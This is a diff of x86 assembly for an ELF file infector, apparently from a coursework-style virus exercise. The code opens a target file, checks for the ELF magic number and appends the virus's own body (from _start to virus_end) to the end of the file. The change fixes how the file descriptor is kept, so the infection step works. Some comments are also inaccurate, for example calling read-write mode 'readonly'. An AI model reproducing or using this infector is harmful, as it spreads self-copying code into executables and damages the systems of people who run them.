@@ -60,18 +60,19 @@ _start:
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	;CODE START
-	open FileName, 2, 0777 		; open FileName with readonly and 111 permissions  (read)
-	cmp eax, 0
+	open FileName, 2, 777 		; open FileName with readonly and 111 permissions  (read)
+	mov edx, eax				; save fd in edx
+	cmp edx, 0
 	jl _print_failure
-	read eax, esp, 4			; read first 4 bytes into esp (reserved place)
+	read edx, esp, 4			; read first 4 bytes into esp (reserved place)
 	cmp dword [esp], 0x464c457f ;cmp STK_RES to elf magic bytes
 	jne _print_failure
 	;now we should write the code from _start to virus_end
 	call get_my_loc				;now ecx holds location for next_i
 	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
-	lseek eax, 0, SEEK_END		;jump with the ELF file descriptor to it's end
-	write eax, ecx, virus_end-_start
-	close eax
+	lseek edx, 0, SEEK_END		;jump with the ELF file descriptor to it's end
+	write edx, ecx, virus_end-_start
+	close edx
 	jmp VirusExit
 	
 	_print_failure:
